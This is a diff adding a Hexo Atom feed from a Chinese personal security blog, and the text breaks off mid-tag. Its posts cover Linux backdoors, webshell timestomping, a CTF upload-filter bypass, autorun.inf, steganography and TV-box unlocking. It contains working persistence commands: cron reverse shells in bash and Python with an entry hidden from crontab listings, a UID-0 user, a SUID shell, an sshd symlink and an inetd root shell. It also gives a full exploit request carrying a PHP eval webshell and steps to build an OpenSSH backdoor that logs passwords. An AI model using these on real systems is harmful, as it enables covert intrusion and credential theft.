@@ -1,0 +1,384 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>从零开始的学习生涯</title>
+  
+  <subtitle>FDrag0n的学习生涯</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://yoursite.com/"/>
+  <updated>2018-11-12T11:57:42.710Z</updated>
+  <id>http://yoursite.com/</id>
+  
+  <author>
+    <name>FDrag0n</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>自用Linux命令手册</title>
+    <link href="http://yoursite.com/2018/11/11/%E8%87%AA%E7%94%A8Linux%E5%91%BD%E4%BB%A4%E6%89%8B%E5%86%8C/"/>
+    <id>http://yoursite.com/2018/11/11/自用Linux命令手册/</id>
+    <published>2018-11-11T14:42:50.000Z</published>
+    <updated>2018-11-12T11:57:42.710Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Linux-Unix-修改文件时间戳"><a href="#Linux-Unix-修改文件时间戳" class="headerlink" title="Linux/Unix 修改文件时间戳"></a>Linux/Unix 修改文件时间戳</h1><p>Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。</p><p>比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。</p><a id="more"></a><p>利用方法</p><p><code>touch -r index.php webshell.php</code></p><p>或者直接将时间戳修改成某年某月某日。如下 2018 年 11 月 11 日。</p><p><code>touch -t 1811111042.30 webshell.php</code></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;Linux-Unix-修改文件时间戳&quot;&gt;&lt;a href=&quot;#Linux-Unix-修改文件时间戳&quot; class=&quot;headerlink&quot; title=&quot;Linux/Unix 修改文件时间戳&quot;&gt;&lt;/a&gt;Linux/Unix 修改文件时间戳&lt;/h1&gt;&lt;p&gt;Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。&lt;/p&gt;
+&lt;p&gt;比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Linux后门总结</title>
+    <link href="http://yoursite.com/2018/11/07/2018-11-7-Linux%E5%90%8E%E9%97%A8%E6%80%BB%E7%BB%93/"/>
+    <id>http://yoursite.com/2018/11/07/2018-11-7-Linux后门总结/</id>
+    <published>2018-11-07T11:09:37.000Z</published>
+    <updated>2018-11-12T11:57:56.052Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h1><p>ubuntu16.04<br>反弹shell目标：127.0.0.1:233</p><h1 id="cron定时反弹shell"><a href="#cron定时反弹shell" class="headerlink" title="cron定时反弹shell"></a>cron定时反弹shell</h1><a id="more"></a><h2 id="修改crontab文件"><a href="#修改crontab文件" class="headerlink" title="修改crontab文件"></a>修改crontab文件</h2><p> 创建文件 /etc/…</p><pre><code>#!/bin/bashif netstat -ano|grep -v grep | grep &quot;127.0.0.1&quot;&gt;/dev/nullthenecho &quot;OK&quot;&gt;/dev/nullelse/sbin/iptables --policy INPUT ACCEPT/sbin/iptables --policy OUTPUT ACCEPTbash -i &gt;&amp; /dev/tcp/127.0.0.1/233 0&gt;&amp;1fi</code></pre><p>增加权限</p><p><code>chmod +sx /etc/...</code></p><p>然后在/etc/crontab中添加定时任务</p><p><code>*/1 * * * * root /etc/...</code></p><p>最后重启一下 crond 的服务<br><code>service cron reload</code></p><h2 id="一句话Crontab后门"><a href="#一句话Crontab后门" class="headerlink" title="一句话Crontab后门"></a>一句话Crontab后门</h2><p>bash版本<br><code>(crontab -l;printf &quot;*/1 * * * * exec 9&lt;&gt; /dev/tcp/127.0.0.1/233;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for</code>whoami<code>%100c\n&quot;)|crontab -</code><br>python版本<br><code>(crontab -l;printf &quot;*/5 * * * *  /usr/bin/python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,233));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;;\r\rno crontab for</code>whoami<code>%100c\n&quot;)|crontab -</code></p><h1 id="Linux-Unix-添加-UID-为-0-的用户"><a href="#Linux-Unix-添加-UID-为-0-的用户" class="headerlink" title="Linux/Unix 添加 UID 为 0 的用户"></a>Linux/Unix 添加 UID 为 0 的用户</h1><p>免交互设置密码<br>    useradd seradd -u 0 -o -g root -G fdrag0n</p><pre><code>echo &quot;passwd&quot; | passwd --stdin fdrag0n</code></pre><p>因为linux可能有密码策略<br>所以推荐使用强密码替换passwd</p><h1 id="爆破linux密码"><a href="#爆破linux密码" class="headerlink" title="爆破linux密码"></a>爆破linux密码</h1><p>取出/etc/shadow<br>hashcat爆破</p><h1 id="ssh公钥免密"><a href="#ssh公钥免密" class="headerlink" title="ssh公钥免密"></a>ssh公钥免密</h1><p>将客户端生成的ssh公钥写到所控服务器的~/.ssh/authorized_keys中，然后客户端利用私钥完成认证即可登录。</p><p>客户端：</p><pre><code>$ ssh-keygen -t rsa$ lsid_rsa  id_rsa.pub</code></pre><p>把id_rsa.pub写入服务端的authorized_keys中，并修改好相应权限。</p><p>服务端：</p><pre><code>$ chmod 600 ~/.ssh/authorized_keys$ chmod 700 ~/.ssh</code></pre><p>这种后门的特点是简单易用，但在实战中会被服务器的配置环境所限制，以及容易被发现(只要运维不傻)。</p><h1 id="软连接后门"><a href="#软连接后门" class="headerlink" title="软连接后门"></a>软连接后门</h1><pre><code>ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=23333;</code></pre><p>经典后门。直接对sshd建立软连接，之后用任意密码登录即可。</p><p>但这隐蔽性很弱，防护软件或者查看端口状态都可以找到。</p><p><strong>重启会断开</strong></p><h1 id="SUID-shell"><a href="#SUID-shell" class="headerlink" title="SUID shell"></a>SUID shell</h1><p>在root账号下执行</p><pre><code>cp /bin/bash /.fdrag0nchmod 4755 /.fdrag0n</code></pre><p>在普通用户下执行</p><pre><code>/.fdrag0n -p</code></pre><p><strong>检查手段</strong></p><pre><code>find / -perm +4000 -ls</code></pre><h1 id="inetd后门"><a href="#inetd后门" class="headerlink" title="inetd后门"></a>inetd后门</h1><p>修改 /etc/inetd.conf 文件</p><p>原文件：</p><pre><code>#chargen dgram udp wait root internal#discard stream tcp nowait root internal#discard dgram udp wait root internal#daytime stream tcp nowait root internal</code></pre><p>修改为:</p><pre><code>#discard stream tcp nowait root internal#discard dgram udp wait root internaldaytime stream tcp nowait root /bin/bash bash -i</code></pre><p>然后重启inetd</p><pre><code>ps -ef | grep inetdrootkill -HUP xxx</code></pre><p>然后nc连接即可</p><h1 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a>rootkit</h1><h2 id="openssh后门"><a href="#openssh后门" class="headerlink" title="openssh后门"></a>openssh后门</h2><p>参见<a href="https://fdrag0n.github.io/2018/05/15/SSH后门复现/" title="ssh后门复现" target="_blank" rel="noopener">https://fdrag0n.github.io/2018/05/15/SSH后门复现/</a></p><h2 id="内核级rookit"><a href="#内核级rookit" class="headerlink" title="内核级rookit"></a>内核级rookit</h2><p>暂未复现，复现后补上</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;测试环境&quot;&gt;&lt;a href=&quot;#测试环境&quot; class=&quot;headerlink&quot; title=&quot;测试环境&quot;&gt;&lt;/a&gt;测试环境&lt;/h1&gt;&lt;p&gt;ubuntu16.04&lt;br&gt;反弹shell目标：127.0.0.1:233&lt;/p&gt;
+&lt;h1 id=&quot;cron定时反弹shell&quot;&gt;&lt;a href=&quot;#cron定时反弹shell&quot; class=&quot;headerlink&quot; title=&quot;cron定时反弹shell&quot;&gt;&lt;/a&gt;cron定时反弹shell&lt;/h1&gt;
+    
+    </summary>
+    
+    
+      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>PHP数组与c数组差异而引发的安全问题</title>
+    <link href="http://yoursite.com/2018/08/24/PHP%E6%95%B0%E7%BB%84%E4%B8%8Ec%E6%95%B0%E7%BB%84%E5%B7%AE%E5%BC%82%E8%80%8C%E5%BC%95%E5%8F%91%E7%9A%84%E9%97%AE%E9%A2%98/"/>
+    <id>http://yoursite.com/2018/08/24/PHP数组与c数组差异而引发的问题/</id>
+    <published>2018-08-24T14:19:24.000Z</published>
+    <updated>2018-09-02T02:32:34.436Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="C语言数组"><a href="#C语言数组" class="headerlink" title="C语言数组"></a>C语言数组</h1><p><strong>C语言的数组都是由连续的内存位置组成。最低的地址对应第一个元素，最高的地址对应最后一个元素。</strong><br><img src="https://fdrag0n.github.io/image/2018-8-24 235941/arrays.jpg" alt="Alt text"><br>设有一个数组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int array[2];</span><br></pre></td></tr></table></figure><p>无论是先给<code>array[0]</code>赋值,还是先给<code>array[1]</code>赋值，其在内存中的排序都是<code>array[0]</code>在前面<code>array[1]</code>在后面，所以无论是用指针指向array的最后一个单元还是直接引用<code>array[1]</code>的值,其所指的都是同一个值。</p><h1 id="PHP的数组"><a href="#PHP的数组" class="headerlink" title="PHP的数组"></a>PHP的数组</h1><p><strong>而PHP数组与C语言数组不一样，PHP 中的数组实际上是一个有序映射。映射是一种把 values 关联到 keys 的类型。此类型在很多方面做了优化，因此可以把它当成真正的数组，或列表（向量），散列表（是映射的一种实现），字典，集合，栈，队列以及更多可能性。由于数组元素的值也可以是另一个数组，树形结构和多维数组也是允许的。</strong><br>贴上一个简易的上传过滤源码</p><pre><code>&lt;?php    $file = $_GET[&apos;file&apos;];    if (!is_array($file)) {        $file = explode(&apos;.&apos;, strtolower($file));    }    print_r ($file);    echo &apos;&lt;/br&gt;&apos;;    $ext = end($file);    if (!in_array($ext, [&apos;jpg&apos;, &apos;png&apos;, &apos;gif&apos;])) {        print(&apos;This file is not allowed!&lt;/br&gt;&apos;);    }    else print(&apos;success!&lt;/br&gt;&apos;);    var_dump($file);    echo &apos;&lt;/br&gt;&apos;;    $filename = reset($file) . &apos;.&apos; . $file[count($file) - 1];    echo &apos;filename:&apos;.$filename;    echo &apos;&lt;/br&gt;&apos;;    echo &apos;end($file):&apos;.end($file);?&gt;</code></pre><p>如图<code>file[0]</code>和<code>file[1]</code>都是由get传参，如果先给<code>file[0]</code>赋值png，再给<code>file[1]</code>赋值php的话，会被拦截。</p><pre><code>file[0]=png&amp;file[1]=php</code></pre><p>但是如果先给<code>file[1]</code>赋值php，再给<code>file[0]</code>赋值png的话，则可以成功绕过过滤规则上传。</p><pre><code>file[1]=php&amp;file[0]=png</code></pre><p>演示截图：</p><p><img src="https://fdrag0n.github.io/image/2018-8-24 235941/2018-8-24 231639.PNG" alt="Alt text"></p><p>代码第六行和第十二行将其显示出来，由图右侧可见，如果先给<code>file[0]</code>赋值png，再给<code>file[1]</code>赋值php的话，数组是<code>Array ( [0] =&gt; png [1] =&gt; php )</code>，会被拦截。</p><p>而如果先给<code>file[1]</code>赋值php，再给<code>file[0]</code>赋值png的话，数组就是<code>Array ( [1] =&gt; php [0] =&gt; png )</code> ,它所占内存区域中最后一个单元是<code>file[0]=&gt;png</code>，而<strong>不像</strong>C语言一样是file[1]，所以如果过滤代码一方面用<code>end()</code>来取出数组最后一个单元，而另外一处却用<code>$file[count($file) - 1]</code>来取出最后一个单元，就会存在有绕过的漏洞。</p><h1 id="拿python来比较一下更好说明"><a href="#拿python来比较一下更好说明" class="headerlink" title="拿python来比较一下更好说明"></a>拿python来比较一下更好说明</h1><ul><li>C语言的数组更像Python 列表(List)</li><li>而PHP的数组像Python 字典(Dictionary)</li></ul><h1 id="涉及到的CTF：-网鼎杯第二场的上传题–wafUpload"><a href="#涉及到的CTF：-网鼎杯第二场的上传题–wafUpload" class="headerlink" title="涉及到的CTF： 网鼎杯第二场的上传题–wafUpload"></a>涉及到的CTF： 网鼎杯第二场的上传题–wafUpload</h1><pre><code>&lt;?php$sandbox = &apos;/var/www/html/upload/&apos; . md5(&quot;phpIsBest&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);@mkdir($sandbox);@chdir($sandbox);if (!empty($_FILES[&apos;file&apos;])) {#mime checkif (!in_array($_FILES[&apos;file&apos;][&apos;type&apos;], [&apos;image/jpeg&apos;, &apos;image/png&apos;, &apos;image/gif&apos;])) {die(&apos;This type is not allowed!&apos;);}#check filename$file = empty($_POST[&apos;filename&apos;]) ? $_FILES[&apos;file&apos;][&apos;name&apos;] : $_POST[&apos;filename&apos;];if (!is_array($file)) {$file = explode(&apos;.&apos;, strtolower($file));}$ext = end($file);if (!in_array($ext, [&apos;jpg&apos;, &apos;png&apos;, &apos;gif&apos;])) {die(&apos;This file is not allowed!&apos;);}$filename = reset($file) . &apos;.&apos; . $file[count($file) - 1];if (move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $sandbox . &apos;/&apos; . $filename)) {echo &apos;Success!&apos;;echo &apos;filepath:&apos; . $sandbox . &apos;/&apos; . $filename;} else {echo &apos;Failed!&apos;;}}show_source(__file__);?&gt;</code></pre><ul><li>第8-10行mime check部分 MIME 类型检测，使用图片马绕过。</li><li>第12-20行check filename部分 对文件后缀进行了检测，而后缀名则是取 <code>$file</code> 数组中最后一个元素。然后在生成文件的时候，文件名取<code>$file</code> 数组的最后一个元素做后缀，这明显存在绕过。我们只要控制<code>$file</code>数组中参数的即可绕过并 getshell ，请求数据包如下</li></ul><pre><code>POST / HTTP/1.1Host: 4b590ee044fe8fb3a180712f8407e4136069037e.game.ichunqiu.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://4b590ee044fe8fb3a180712f8407e4136069037e.game.ichunqiu.com/Content-Type: multipart/form-data; boundary=---------------------------9930139772306Content-Length: 524DNT: 1Connection: closeUpgrade-Insecure-Requests: 1-----------------------------9930139772123Content-Disposition: form-data; name=&quot;filename[1]&quot;php-----------------------------9930139772123Content-Disposition: form-data; name=&quot;filename[0]&quot;png-----------------------------9930139772123Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;fdrag0n.jpg&quot;Content-Type: image/jpeg&lt;?php @eval($_POST[&apos;a&apos;]);?&gt;-----------------------------9930139772123Content-Disposition: form-data; name=&quot;submit&quot;Submit-----------------------------9930139772123--</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;C语言数组&quot;&gt;&lt;a href=&quot;#C语言数组&quot; class=&quot;headerlink&quot; title=&quot;C语言数组&quot;&gt;&lt;/a&gt;C语言数组&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;C语言的数组都是由连续的内存位置组成。最低的地址对应第一个元素，最高的地址对应最后一个元素。&lt;/st
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>利用autorun.inf预防自动运行病毒及个性化磁盘图标</title>
+    <link href="http://yoursite.com/2018/08/13/%E5%88%A9%E7%94%A8autorun-inf%E9%A2%84%E9%98%B2%E8%87%AA%E5%8A%A8%E8%BF%90%E8%A1%8C%E7%97%85%E6%AF%92%E5%8F%8A%E4%B8%AA%E6%80%A7%E5%8C%96%E7%A3%81%E7%9B%98%E5%9B%BE%E6%A0%87/"/>
+    <id>http://yoursite.com/2018/08/13/利用autorun-inf预防自动运行病毒及个性化磁盘图标/</id>
+    <published>2018-08-13T02:37:01.000Z</published>
+    <updated>2018-08-23T10:09:23.289Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="AutoRun简介"><a href="#AutoRun简介" class="headerlink" title="AutoRun简介"></a>AutoRun简介</h1><p>  AutoRun和AutoPlay是微软窗口系统的组件，其内容标示着系统在搜索到设备时可采取的行动。</p><p>  AutoRun在Windows 95时首度露面，目的是帮助用户正确运行光盘上制作者想要运行的文件，另外AutoRun也能透过双击我的计算机内的设备图标启动AutoRun。但后来U盘病毒横行，微软发布更新关闭非光盘驱动器的AutoRun。</p><p>  在Windows XP之后，微软让用户方便选择相关应用程序，制作出如图形化接口方式让用户选择如何处理设备中的文件。</p><h1 id="AutoRun-inf文件"><a href="#AutoRun-inf文件" class="headerlink" title="AutoRun.inf文件"></a>AutoRun.inf文件</h1><p>  autrun.inf是我们电脑使用中比较常见的文件之一 ，其作用是允许在双击磁盘时自动运行指定的某个文件。但是近几年出现了用autorun.inf文件传播木马或病毒，它通过使用者的误操作让目标程序执行，达到侵入电脑的目的，带来了很大的负面影响。</p><h1 id="AutoRun-inf的示例"><a href="#AutoRun-inf的示例" class="headerlink" title="AutoRun.inf的示例"></a>AutoRun.inf的示例</h1><pre><code>[autorun] open=setup.exe icon=setup.exe,0label=My install CD</code></pre><p>双击盘符时会运行setup.exe，而显示图标为setup.exe中第0个图标（即第1个图标），标签是My install CD。</p><h1 id="AutoRun-inf的默认激活"><a href="#AutoRun-inf的默认激活" class="headerlink" title="AutoRun.inf的默认激活"></a>AutoRun.inf的默认激活</h1><ul><li>插入设备时启动。</li><li>双击我的计算机设备时启动。</li><li>对我的计算机设备点击右键菜单中 “AutoRun” 项目时启动。</li><li>其他(如点击根目录文件夹)则不会启动。<h2 id="windows-XP-以前"><a href="#windows-XP-以前" class="headerlink" title="windows XP 以前"></a>windows XP 以前</h2></li><li>所有设备都会依照 Autorun.inf 启动。<h2 id="Windows-7"><a href="#Windows-7" class="headerlink" title="Windows 7"></a>Windows 7</h2></li><li>只有光盘会先运行 autorun.inf</li></ul><h1 id="利用autorun-inf给硬盘改图标及简易防病毒"><a href="#利用autorun-inf给硬盘改图标及简易防病毒" class="headerlink" title="利用autorun.inf给硬盘改图标及简易防病毒"></a>利用autorun.inf给硬盘改图标及简易防病毒</h1><h2 id="个性化磁盘—改图标"><a href="#个性化磁盘—改图标" class="headerlink" title="个性化磁盘—改图标"></a>个性化磁盘—改图标</h2><p>在对应磁盘的根目录新建一个记事本，然后修改里面内容</p><pre><code>[AUTORUN]ICON=drag0n.ico</code></pre><p>然后将其保存为autorun.inf（注意ico的文件名字符不要超过6位）</p><p>再将你想用的图标转换成ico文件，推荐分辨率不要超过48x48，然后一同放进同目录下，然后改名为fdragn.ico。</p><p><img src="https://fdrag0n.github.io/image/1.png" alt=""></p><h2 id="简易防病毒"><a href="#简易防病毒" class="headerlink" title="简易防病毒"></a>简易防病毒</h2><p>此时文件是显示在当前目录下的，可以使用Windows下的attrib命令给文件增加属性</p><pre><code>attrib指令的格式和常用参数为ATTRIB [+R | -R] [+A | -A ] [+S | -S] [+H | -H] [[drive:] [path] filename] [/S [/D]]+ 设置属性。- 清除属性。R 只读文件属性。A 存档文件属性。S 系统文件属性。H 隐藏文件属性。I 无内容索引文件属性。[drive:][path][filename]指定要处理的文件属性。/S 处理当前文件夹及其子文件夹中的匹配文件。/D 处理文件夹。/L 处理符号链接和符号链接目标的属性。</code></pre><p>所以使用</p><pre><code>attrib +s +h +r autorun.inf</code></pre><p>给autorun.inf添加系统、隐藏和只读属性，防止病毒修改autorun.inf文件</p><pre><code>attrib +s +h drag0n.ico</code></pre><p>给drag0n.ico文件添加系统和隐藏属性，美观。</p><p><img src="https://fdrag0n.github.io/image/2.png" alt=""></p><p>如果还要修改的话，使用以下命令将其显示出来</p><pre><code>attrib -s -h -r autorun.infattrib -s -h fdrag0n.ico</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;AutoRun简介&quot;&gt;&lt;a href=&quot;#AutoRun简介&quot; class=&quot;headerlink&quot; title=&quot;AutoRun简介&quot;&gt;&lt;/a&gt;AutoRun简介&lt;/h1&gt;&lt;p&gt;  AutoRun和AutoPlay是微软窗口系统的组件，其内容标示着系统在搜索到设
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>ctf常见隐写术总结</title>
+    <link href="http://yoursite.com/2018/07/30/ctf%E5%B8%B8%E8%A7%81%E9%9A%90%E5%86%99%E6%9C%AF%E6%80%BB%E7%BB%93/"/>
+    <id>http://yoursite.com/2018/07/30/ctf常见隐写术总结/</id>
+    <published>2018-07-30T03:57:03.000Z</published>
+    <updated>2018-11-12T10:36:45.153Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>准备工具：winhex付费版（免费版功能有缺失），Stegsolve，MP3Steno等</strong></p><h1 id="ctf常见隐写术总结"><a href="#ctf常见隐写术总结" class="headerlink" title="ctf常见隐写术总结"></a>ctf常见隐写术总结</h1><h2 id="简单隐写："><a href="#简单隐写：" class="headerlink" title="简单隐写："></a>简单隐写：</h2><ol><li>右键查看图片属性，检查图片简介。</li><li><p>winhex打开，Ctrl+F查找有无flag明文。</p><h2 id="文件类型："><a href="#文件类型：" class="headerlink" title="文件类型："></a>文件类型：</h2><p>给出的文件不一定是它后缀名显示的文件，所以应该先用winhex打开它确认文件种类</p></li><li><p>JPEG (jpg)，文件头：FFD8FF</p></li><li>PNG (png)，文件头：89504E47</li><li>GIF (gif)，文件头：47494638</li><li>Windows Bitmap (bmp)，文件头：424D</li><li>ZIP Archive (zip)，文件头：504B0304</li><li><p>RAR Archive (rar)，文件头：52617221</p><h2 id="复合文件："><a href="#复合文件：" class="headerlink" title="复合文件："></a>复合文件：</h2><p>在kali里面使用binwalk工具即可查看<br>如：</p><p> root@kali:~# binwalk ‘/root/桌面/misc1.jpg’ </p><p> DECIMAL   HEXADECIMAL DESCRIPTION</p><p> -——————————————————————————-<br> 0 0x0 JPEG image data, EXIF standard<br> 120xC TIFF image data, little-endian offset of first image directory: 8<br> 4413190x6BBE7 Zip archive data, encrypted at least v2.0 to extract, compressed size: 90598, uncompressed size: 91905, name: hidden.jpg<br> 5319570x81DF5 Zip archive data, encrypted at least v2.0 to extract, compressed size: 38092, uncompressed size: 38829, name: logo.png<br> 5702690x8B39D End of Zip archive</p></li></ol><p>可以看到有zip之类的文件在里面，所以直接利用binwalk提取，</p><p><code>binwalk -e</code></p><h2 id="图片高度"><a href="#图片高度" class="headerlink" title="图片高度"></a>图片高度</h2><p>一般这类的图片都会有明显的提示，包括但不限于箭头指向图片外，图片看上去不完整等。<br>根据对应文件种类找到其高度位进行修改。</p><ol><li>png文件，</li></ol><h2 id="多图层隐写"><a href="#多图层隐写" class="headerlink" title="多图层隐写"></a>多图层隐写</h2><p>最牛神器 <strong>zsteg</strong>毁天灭地</p><p>隐写术一大神器：<strong>stegsolve</strong></p><h3 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h3><ol><li>如果上文测试找不到flag的话，可以使用stegsolve打开文件，然后点击左右翻动的按钮，可能会出现flag。</li><li>提取低位信息，一般都藏在0,1,2这些低位里面，在软件功能选项中查看Analyse→Data Extract，逐个调试。</li></ol>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;strong&gt;准备工具：winhex付费版（免费版功能有缺失），Stegsolve，MP3Steno等&lt;/strong&gt;&lt;/p&gt;
+&lt;h1 id=&quot;ctf常见隐写术总结&quot;&gt;&lt;a href=&quot;#ctf常见隐写术总结&quot; class=&quot;headerlink&quot; title=&quot;ctf
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>破解中兴电视盒子</title>
+    <link href="http://yoursite.com/2018/07/19/%E7%A0%B4%E8%A7%A3%E4%B8%AD%E5%85%B4%E7%94%B5%E8%A7%86%E7%9B%92%E5%AD%90/"/>
+    <id>http://yoursite.com/2018/07/19/破解中兴电视盒子/</id>
+    <published>2018-07-18T16:59:29.000Z</published>
+    <updated>2018-07-20T09:03:46.838Z</updated>
+    
+    <content type="html"><![CDATA[<p>#记一次破解电信盒子</p><p>##型号 ZTEB860AV1.1<br>因为以前搞过家里的tcl电视，所以流程已经清楚</p><ol><li>开启网络adb调试</li><li>为所欲为</li></ol><p>###开始</p><ul><li>百度得知进入设置的密码为：6321<br>进入设置后连接WiFi，然后到设置里找到开启adb调试，结果发现开启adb居然也需要密码，不得不说这群人为了控制用户也是下了血本，还好百度找到有写好的软件，上链接</li></ul><ul><li>工具<a href="https://pan.baidu.com/s/1TbV688Vi2-WjdOWUKg_Mpg" title="百度云" target="_blank" rel="noopener">相关软件</a> </li><li><p>利用网络adb给电视盒子安装电视管理软件或者第三方桌面开始为所欲为。</p></li><li><p>在这里又发现一个问题，这边运营商将网线插口插在光猫的iptv上面，而那条路线是专线，无法正常使用，机顶盒开机会自动检测是否在这个网络下，不在就无法正常开机，所以每次开机的时候还得手动将设置中的网络设置改成有线连接，如果使用第三方应用则使用无线连接局域网即可，暂时没有想到更好地解决方案</p></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;#记一次破解电信盒子&lt;/p&gt;
+&lt;p&gt;##型号 ZTEB860AV1.1&lt;br&gt;因为以前搞过家里的tcl电视，所以流程已经清楚&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;开启网络adb调试&lt;/li&gt;
+&lt;li&gt;为所欲为&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;###开始&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;百度得知
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>SSH后门复现</title>
+    <link href="http://yoursite.com/2018/05/15/SSH%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/"/>
+    <id>http://yoursite.com/2018/05/15/SSH后门复现/</id>
+    <published>2018-05-15T12:01:46.000Z</published>
+    <updated>2018-05-15T12:05:51.030Z</updated>
+    
+    <content type="html"><![CDATA[<p>#SSH后门复现</p><h3 id="最开始先查看自己的ssh版本"><a href="#最开始先查看自己的ssh版本" class="headerlink" title="最开始先查看自己的ssh版本"></a>最开始先查看自己的ssh版本</h3><pre><code>ssh -v</code></pre><h3 id="然后下载openssh和ssh后门"><a href="#然后下载openssh和ssh后门" class="headerlink" title="然后下载openssh和ssh后门"></a>然后下载openssh和ssh后门</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget http://down1.chinaunix.net/distfiles/openssh-5.9p1.tar.gz</span><br><span class="line">wget http://openbsd.org.ar/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz</span><br><span class="line">tar zxvf openssh-5.9p1.tar.gz</span><br><span class="line">tar zxvf 0x06-openssh-5.9p1.patch.tar.gz</span><br><span class="line">cd openssh-5.9p1.patch/</span><br><span class="line">cp sshbd5.9p1.diff ../openssh-5.9p1</span><br><span class="line">cd ../openssh-5.9p1</span><br><span class="line">patch &lt; sshbd5.9p1.diff   //patch  后门</span><br></pre></td></tr></table></figure><p>这时有可能出现报错信息<br><strong>-bash: patch: command not found</strong><br>代表没有安装patch命令包，解决方案：</p><pre><code>yum -y install patch</code></pre><h3 id="备份SSH原始配置文件"><a href="#备份SSH原始配置文件" class="headerlink" title="备份SSH原始配置文件"></a>备份SSH原始配置文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old</span><br><span class="line">mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old</span><br></pre></td></tr></table></figure><h3 id="修改后门密码，和记录文件的位置"><a href="#修改后门密码，和记录文件的位置" class="headerlink" title="修改后门密码，和记录文件的位置"></a>修改后门密码，和记录文件的位置</h3><pre><code>vi includes.h</code></pre><p>找到并修改<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#define ILOG &quot;/tmp/ilog&quot;</span><br><span class="line">//记录登录到本机的用户名和密码</span><br><span class="line">#define OLOG &quot;/tmp/olog&quot;</span><br><span class="line">//记录本机登录到远程的用户名和密码</span><br><span class="line">#define SECRETPW &quot;fdrag0n&quot;</span><br><span class="line">//你后门的密码</span><br></pre></td></tr></table></figure></p><h3 id="修改SSH版本信息，改为第一步看到的"><a href="#修改SSH版本信息，改为第一步看到的" class="headerlink" title="修改SSH版本信息，改为第一步看到的"></a>修改SSH版本信息，改为第一步看到的</h3><pre><code>vi version.h</code></pre><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>如果没有以上环境有可能会报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install -y gcc</span><br><span class="line">yum install -y openssl openssl-devel pam-devel</span><br><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5</span><br></pre></td></tr></table></figure><p>如果出现报错信息中带有：<br><strong>configure: error:  zlib.h missing – please install first or check config.log</strong>之类的信息<br>安装zib</p><pre><code>yum install -y zlib</code></pre><h3 